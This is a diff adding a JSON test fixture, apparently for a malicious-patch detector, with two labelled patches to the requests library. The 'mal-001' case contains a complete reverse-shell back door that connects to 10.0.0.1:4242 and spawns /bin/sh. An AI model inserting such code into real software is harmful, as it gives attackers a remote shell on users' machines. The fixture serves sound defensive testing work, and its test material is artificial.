@@ -1,0 +1,18 @@
+{
+  "cases": [
+    {
+      "id": "mal-001",
+      "repo_name": "psf/requests",
+      "file_name": "requests/api.py",
+      "expected_label": "malicious",
+      "patch": "--- a/requests/api.py\n+++ b/requests/api.py\n@@ -1,4 +1,8 @@\n import os\n+import socket\n+import subprocess\n+\n+def back_door():\n+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n+    s.connect((\"10.0.0.1\",4242))\n+    os.dup2(s.fileno(),0)\n+    os.dup2(s.fileno(),1)\n+    os.dup2(s.fileno(),2)\n+    p=subprocess.call([\"/bin/sh\",\"-i\"])\n"
+    },
+    {
+      "id": "ben-001",
+      "repo_name": "psf/requests",
+      "file_name": "requests/models.py",
+      "expected_label": "benign",
+      "patch": "--- a/requests/models.py\n+++ b/requests/models.py\n@@ -10,3 +10,5 @@\n class Response:\n     pass\n+\n+def status_code_ok():\n+    return 200\n"
+    }
+  ]
+}
